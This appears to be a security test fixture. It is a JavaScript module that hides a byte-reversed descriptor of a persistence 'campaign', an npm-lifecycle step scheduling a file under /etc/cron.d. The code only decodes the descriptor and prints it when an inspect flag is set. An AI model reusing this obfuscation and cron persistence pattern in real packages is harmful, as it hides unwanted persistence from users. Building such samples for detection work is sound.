  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_20eeca14 = "[53,55,48,100,99,101,45,101,100,111,110,47,100,46,110,111,114,99,47,99,116,101,47,61,104,116,97,112,95,101,108,117,100,101,104,99,115,124,48,66,53,55,48,68,67,69,45,69,68,79,78,61,100,105,95,110,103,105,97,112,109,97,99,124,49,61,116,110,117,111,99,95,101,103,97,116,115,124,114,111,116,112,105,114,99,115,101,100,95,101,108,99,121,99,101,102,105,108,95,109,112,110,61,114,101,116,112,97,100,97,124,114,111,116,112,105,114,99,115,101,100,95,114,101,116,115,105,103,101,114,44,101,108,117,100,101,104,99,115,95,100,108,105,117,98,61,115,112,101,116,115,124,49,61,118]";
  const Codec_20eeca14 = "json_numbers|reverse_bytes|";

  function load_20eeca14() { return JSON.parse(Material_20eeca14); }
  function decode_20eeca14(e) { return [...e].reverse(); }
  async function recover_20eeca14() {
    const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const e = load_20eeca14(); let d = [];
    for (const stage of [decode_20eeca14]) d = stage(e);
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_20eeca14() { return Buffer.from(await recover_20eeca14(), "utf8").toString("utf8"); }
  async function plan_20eeca14() { const inspect = inspect_20eeca14; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_20eeca14;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_20eeca14());
